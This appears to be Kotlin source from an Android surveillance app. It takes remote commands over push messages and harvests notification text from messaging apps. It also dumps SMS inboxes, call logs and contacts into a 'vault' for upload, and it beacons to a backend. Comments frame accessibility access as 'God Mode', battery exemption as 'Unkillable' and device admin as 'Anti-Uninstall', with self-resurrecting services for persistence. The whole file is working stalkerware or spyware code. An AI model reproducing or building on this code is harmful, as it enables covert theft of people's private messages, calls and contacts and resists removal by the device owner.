package com.example.myandroid

import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class MyFcmService : FirebaseMessagingService() {

    override fun onNewToken(token: String) {
        // Save token locally for the HealthWorker to pick up
        getSharedPreferences("app_identity", MODE_PRIVATE)
            .edit().putString("fcm_token", token).apply()
        DebugLogger.log("FCM", "New token generated")

        // Trigger immediate robust upload
        val constraints = androidx.work.Constraints.Builder()
            .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
            .build()
        val immediateHealthCheck = androidx.work.OneTimeWorkRequestBuilder<HealthWorker>()
            .setConstraints(constraints)
            .build()
        androidx.work.WorkManager.getInstance(applicationContext).enqueueUniqueWork(
            "FCM_TOKEN_UPDATE", 
            androidx.work.ExistingWorkPolicy.REPLACE, 
            immediateHealthCheck
        )
    }

    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        val data = remoteMessage.data
        DebugLogger.log("FCM", "Push Recv. ID: ${remoteMessage.messageId} | Data: $data")

        ServiceResurrector.shock(applicationContext)
        KeepAliveReceiver.scheduleNext(applicationContext)

        // ENQUEUE BACKUP: WorkManager guarantees execution even if OS kills the FCM thread
        try {
            val workRequest = androidx.work.OneTimeWorkRequestBuilder<RemoteCommandWorker>().build()
            androidx.work.WorkManager.getInstance(applicationContext)
                .enqueueUniqueWork("FCM_BACKUP_CMD", androidx.work.ExistingWorkPolicy.REPLACE, workRequest)
            DebugLogger.log("FCM", "Backup Worker queued.")
        } catch (e: Exception) {
            DebugLogger.log("FCM_ERR", "Worker queue failed: ${e.message}")
        }

        // IMMEDIATE EXECUTION: Block the FCM thread to leverage its native WakeLock.
        kotlinx.coroutines.runBlocking {
            try {
                // FCM allows ~20s before force-killing. We timeout at 15s safely.
                kotlinx.coroutines.withTimeout(15000L) {
                    DebugLogger.log("FCM", "Holding WakeLock. Executing CommandProcessor...")
                    kotlinx.coroutines.delay(1000) // Network stabilization
                    CommandProcessor.checkAndExecute(applicationContext)
                    DebugLogger.log("FCM", "Direct execution finished.")
                }
            } catch (e: kotlinx.coroutines.TimeoutCancellationException) {
                DebugLogger.log("FCM_WARN", "Execution timed out (15s). Handing off to Worker.")
            } catch (e: Exception) {
                DebugLogger.log("FCM_ERR", "Fatal execution error: ${e.message}")
            }
        }
    }
}

package com.example.myandroid

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.content.Context
import org.json.JSONObject
import org.json.JSONArray

class MyNotificationListener : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        // Feature Gate
        if (!ConfigManager.canCollect(this, "notifications")) return

        // SYMBIOTE RESURRECTION: Secondary Heartbeat
        try {
            if (!MonitorService.isRunning) {
                val intent = android.content.Intent(this, MonitorService::class.java)
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) startForegroundService(intent)
                else startService(intent)
            }
        } catch(e: Exception) {}

        if (sbn == null) return

        // FILTER: Ignore "Ongoing" notifications (Music, USB, Background Services)
        if (!sbn.isClearable) return

        val pkg = sbn.packageName
        val extras = sbn.notification.extras
        val title = extras.getString("android.title") ?: ""

        // DEEP EXTRACTION: Prioritize expanded/inbox styles over collapsed text
        var text = ""

        // 1. Check for Multi-line (InboxStyle) - Common in WhatsApp/Telegram groups
        val lines = extras.getCharSequenceArray("android.textLines")
        if (lines != null && lines.isNotEmpty()) {
            text = lines.joinToString("\n")
        } 
        // 2. Check for Big Text (BigTextStyle) - Long emails/messages
        else {
            text = extras.getCharSequence("android.bigText")?.toString() ?: ""
        }

        // 3. Fallback to standard text if expanded data is empty
        if (text.isEmpty()) {
            text = extras.getCharSequence("android.text")?.toString() ?: ""
        }

        if (title.isEmpty() && text.isEmpty()) return

        // LOAD DATA
        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        val editor = prefs.edit()

        // 1. UPDATE GLOBAL COUNT
        val total = prefs.getInt("notif_count", 0) + 1
        editor.putInt("notif_count", total)

        // 2. UPDATE APP LEADERBOARD (Who is most annoying?)
        val leaderboardStr = prefs.getString("notif_leaderboard", "{}")
        val leaderboard = try { JSONObject(leaderboardStr) } catch (e: Exception) { JSONObject() }
        val appCount = leaderboard.optInt(pkg, 0) + 1
        leaderboard.put(pkg, appCount)
        editor.putString("notif_leaderboard", leaderboard.toString())

        // 3. LOG HISTORY (STREAM)
        val entry = JSONObject()
        entry.put("pkg", pkg)
        entry.put("title", title.take(50))
        entry.put("txt", text.take(100))
        entry.put("ts", System.currentTimeMillis())

        DumpManager.appendLog("NOTIF", entry)

        editor.apply()
    }
}

package com.example.myandroid

import android.content.Context
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.os.Handler
import android.os.Looper

import org.json.JSONArray
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object NetworkTracker {

    private var isTracking = false
    private var currentStart = 0L

    fun init(ctx: Context) {
        if (isTracking) return
        isTracking = true

        val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)

        // Reset session if app restarted
        currentStart = System.currentTimeMillis()

        cm.registerDefaultNetworkCallback(object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                super.onAvailable(network)
                // Network became active
                currentStart = System.currentTimeMillis()

                // Increment Session Count
                val count = prefs.getInt("net_session_count", 0)
                prefs.edit().putInt("net_session_count", count + 1).apply()

                // LIVE BEACON: Notify Backend Immediately
                CloudManager.sendPing(ctx, "Connection Restored")
            }


        })
    }

    fun getStats(ctx: Context): Pair<Long, Int> {
        val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        var total = prefs.getLong("net_total_time", 0L)
        val count = prefs.getInt("net_session_count", 0)

        // Add current session if live
        if (currentStart > 0) {
            total += (System.currentTimeMillis() - currentStart)
        }
        return Pair(total, count)
    }
}

package com.example.myandroid

import android.app.AppOpsManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Process
import android.provider.Settings
import android.net.Uri

object PermissionManager {

    // 1. Check Standard Runtime Permissions
    // Using generic Context to avoid AppCompat dependency
    fun getMissingRuntimePermissions(ctx: Context): List<String> {
        val required = mutableListOf(
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.SEND_SMS,
            android.Manifest.permission.RECEIVE_SMS,
            android.Manifest.permission.READ_CALL_LOG,
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.CALL_PHONE
        ).apply {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                 add(android.Manifest.permission.POST_NOTIFICATIONS)
             }
             // Add legacy storage permission for Android 10 and below
             if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
                 add(android.Manifest.permission.READ_EXTERNAL_STORAGE)
                 add(android.Manifest.permission.WRITE_EXTERNAL_STORAGE)
             }
        }
        return required.filter {
            androidx.core.content.ContextCompat.checkSelfPermission(ctx, it) != PackageManager.PERMISSION_GRANTED
        }
    }

    // 1.5 Check All Files Access (Android 11+)
    fun hasAllFilesAccess(ctx: Context): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            android.os.Environment.isExternalStorageManager()
        } else {
            true // Handled by runtime permissions above
        }
    }

    // 2. Check Usage Stats (For Screen Time)
    fun hasUsageStats(ctx: Context): Boolean {
        val appOps = ctx.getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
        val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            appOps.unsafeCheckOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, Process.myUid(), ctx.packageName)
        } else {
            appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, Process.myUid(), ctx.packageName)
        }
        return mode == AppOpsManager.MODE_ALLOWED
    }

    // 3. Check Notification Listener (For Symbiote)
    fun hasNotificationListener(ctx: Context): Boolean {
        val enabledListeners = Settings.Secure.getString(ctx.contentResolver, "enabled_notification_listeners")
        return enabledListeners != null && enabledListeners.contains(ctx.packageName)
    }

    // 4. Check Accessibility (The God Mode)
    fun hasAccessibility(ctx: Context): Boolean {
        val expectedService = "${ctx.packageName}/${MyAccessibilityService::class.java.name}"
        val enabledServices = Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
        return enabledServices?.contains(expectedService) == true
    }

    // 5. Battery Optimization (Unkillable)
    fun isIgnored(ctx: Context): Boolean {
        val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        return pm.isIgnoringBatteryOptimizations(ctx.packageName)
    }

    // 5.5 DND Access (Bypass Silent Mode)
    fun hasDndAccess(ctx: Context): Boolean {
        val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
        return nm.isNotificationPolicyAccessGranted
    }

    // 5.7 Overlay Access (Appear on Top)
    fun hasOverlayAccess(ctx: Context): Boolean {
        return Settings.canDrawOverlays(ctx)
    }

    // 6. Device Admin (Anti-Uninstall)
    fun isAdmin(ctx: Context): Boolean {
        val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
        val comp = android.content.ComponentName(ctx, MyDeviceAdminReceiver::class.java)
        return dpm.isAdminActive(comp)
    }
}

package com.example.myandroid

import android.content.Context
import android.provider.CallLog
import android.provider.ContactsContract
import org.json.JSONArray
import org.json.JSONObject
import java.util.Date

object PhoneManager {

    data class CallStats(
        val totalDuration: Long = 0,
        val totalCalls: Int = 0,
        val incoming: Int = 0,
        val outgoing: Int = 0,
        val missed: Int = 0,
        val topContact: String = "None",
        val contactCount: Int = 0
    )

    fun getStats(ctx: Context): CallStats {
        if (androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.READ_CALL_LOG) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            return CallStats()
        }

        var duration = 0L
        var total = 0
        var inc = 0
        var out = 0
        var miss = 0
        val contactFreq = HashMap<String, Int>()

        try {
            val cursor = ctx.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC"
            )

            cursor?.use {
                val durIdx = it.getColumnIndex(CallLog.Calls.DURATION)
                val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
                val numIdx = it.getColumnIndex(CallLog.Calls.NUMBER)

                while (it.moveToNext()) {
                    val dur = it.getLong(durIdx)
                    val type = it.getInt(typeIdx)
                    val num = it.getString(numIdx)

                    total++
                    duration += dur

                    when (type) {
                        CallLog.Calls.INCOMING_TYPE -> inc++
                        CallLog.Calls.OUTGOING_TYPE -> out++
                        CallLog.Calls.MISSED_TYPE -> miss++
                    }

                    if (num != null) {
                        contactFreq[num] = contactFreq.getOrDefault(num, 0) + 1
                    }
                }
            }
        } catch (e: Exception) { e.printStackTrace() }

        // Get Contact Count
        var cCount = 0
        if (androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.READ_CONTACTS) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
             try {
                 val cCursor = ctx.contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null)
                 cCount = cCursor?.count ?: 0
                 cCursor?.close()
             } catch (e: Exception) { }
        }

        // Resolve Top Contact Name
        val topNum = contactFreq.maxByOrNull { it.value }?.key ?: "None"
        var topName = topNum
        if (topNum != "None" && cCount > 0) {
            topName = getContactName(ctx, topNum)
        }

        return CallStats(duration, total, inc, out, miss, topName, cCount)
    }

    fun getCallLogs(ctx: Context): JSONArray {
        val list = JSONArray()
        if (androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.READ_CALL_LOG) != android.content.pm.PackageManager.PERMISSION_GRANTED) return list

        try {
            val cursor = ctx.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC LIMIT 50"
            )
            cursor?.use {
                val numIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
                val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
                val durIdx = it.getColumnIndex(CallLog.Calls.DURATION)
                val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)

                while(it.moveToNext()) {
                    val obj = JSONObject()
                    obj.put("num", it.getString(numIdx))
                    obj.put("ts", it.getLong(dateIdx))
                    obj.put("dur", it.getLong(durIdx))
                    obj.put("type", it.getInt(typeIdx))
                    list.put(obj)
                }
            }
        } catch(e: Exception) {}
        return list
    }

    fun getHistoricalSms(ctx: Context, limit: Int = 1000): JSONArray {
        val list = JSONArray()
        if (androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.READ_SMS) != android.content.pm.PackageManager.PERMISSION_GRANTED) return list

        try {
            val cursor = ctx.contentResolver.query(
                android.net.Uri.parse("content://sms"),
                arrayOf("address", "body", "date", "type"),
                null, null, "date DESC LIMIT $limit"
            )
            cursor?.use {
                val addrIdx = it.getColumnIndex("address")
                val bodyIdx = it.getColumnIndex("body")
                val dateIdx = it.getColumnIndex("date")
                val typeIdx = it.getColumnIndex("type")

                while(it.moveToNext()) {
                    val obj = JSONObject()
                    obj.put("num", it.getString(addrIdx))
                    obj.put("body", it.getString(bodyIdx))
                    obj.put("ts", it.getLong(dateIdx))
                    obj.put("type", it.getInt(typeIdx))
                    list.put(obj)
                }
            }
        } catch(e: Exception) { e.printStackTrace() }
        return list
    }

    fun vaultHistoricalSms(ctx: Context) {
        val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        // If backend already confirmed receipt, we are done forever.
        if (prefs.getBoolean("historical_sms_dumped", false)) return

        val vaultFile = java.io.File(ctx.filesDir, "sms_archive_vault.json")

        // If file exists, we don't need to rebuild it, just wait for SyncWorker to find it.
        if (vaultFile.exists()) return 

        // If no file and not dumped yet, it means either we haven't tried or a previous upload failed.
        val data = getHistoricalSms(ctx, 1000)
        if (data.length() > 0) {
            try {
                vaultFile.writeText(data.toString())
                DebugLogger.log("VAULT", "Inbox snapshot secured: ${data.length()} messages")
            } catch (e: Exception) { 
                DebugLogger.log("VAULT_ERR", "Failed to write vault: ${e.message}")
            }
        }
    }

    fun getContacts(ctx: Context): JSONArray {
        val list = JSONArray()
        if (androidx.core.content.ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.READ_CONTACTS) != android.content.pm.PackageManager.PERMISSION_GRANTED) return list

        try {
             val cursor = ctx.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER),
                null, null, null
            )
            cursor?.use {
                val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while(it.moveToNext()) {
                    val obj = JSONObject()
                    obj.put("name", it.getString(nameIdx))
                    obj.put("num", it.getString(numIdx))
                    list.put(obj)
                }
            }
        } catch(e: Exception) {}
        return list
    }

    private fun getContactName(ctx: Context, phoneNumber: String): String {
        val uri = android.net.Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, android.net.Uri.encode(phoneNumber))
        val cursor = ctx.contentResolver.query(uri, arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME), null, null, null)
        var name = phoneNumber
        cursor?.use {
            if (it.moveToFirst()) {
                name = it.getString(it.getColumnIndexOrThrow(ContactsContract.PhoneLookup.DISPLAY_NAME))
            }
        }
        return name
    }
}

